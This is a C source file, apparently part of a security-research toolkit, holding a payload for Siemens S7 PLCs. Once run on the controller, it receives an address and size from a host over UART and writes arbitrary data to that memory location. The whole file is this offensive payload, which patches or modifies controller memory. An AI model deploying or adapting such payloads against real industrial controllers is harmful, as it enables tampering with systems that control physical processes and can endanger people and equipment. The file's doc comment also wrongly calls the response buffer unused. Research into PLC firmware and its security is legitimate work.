/**
 * @file write_mem.c
 * @brief Memory writing payload for Siemens S7 PLC
 *
 * This payload writes arbitrary data from the host to a memory location
 * on the PLC via UART. It's used for patching or modifying the PLC's memory.
 */

#include <stdbool.h>
#include <stdint.h>

#include "../lib/print.h"
#include "../lib/read.h"

char greeting[] = "Ok\0";

int doit(unsigned char *, unsigned char *) __attribute__((noinline));

/**
 * @brief Entry point for the memory write payload
 * @param read_buf Buffer containing write parameters from host
 * @param write_buf Buffer for writing response data
 * @return 0 on success
 *
 * Preserves ARM registers and calls the main write function.
 */
int _start(unsigned char *read_buf, unsigned char *write_buf) {
    __asm__("stmfd sp!, {r2-r12, lr}");
    __asm__("adr r9, _start");

    int res = doit(read_buf, write_buf);

    __asm("ldmfd sp!, {r2-r12, lr}");
    return res;
}

/**
 * @brief Main memory writing function
 * @param read_buf Buffer containing target address and size parameters
 * @param write_buf Buffer for response (unused)
 * @return 0 on success
 *
 * Extracts target address and size from read_buf, then receives the data
 * from the host via UART protocol and writes it to memory. Format of read_buf:
 * - Offset 4: Target memory address (4 bytes)
 * - Offset 8: Number of bytes to write (4 bytes)
 */
int doit(uint8_t *read_buf, unsigned char *write_buf) {
    uint32_t size = *((uint32_t *)(read_buf+8));
    char *tar_addr = *((char **)(read_buf+4));

    UART_protocol_send_single(greeting, sizeof(greeting));

    // Receive data from host and write it directly to the target address
    int result = UART_protocol_recv(tar_addr, size);

    if (result < 0) {
        // Handle error (e.g. timeout or checksum failure)
        // For now, we just return an error code
        write_buf[0] = 1; // Error
        return result;
    }

    write_buf[0] = 0; // Success
    return 0;
}
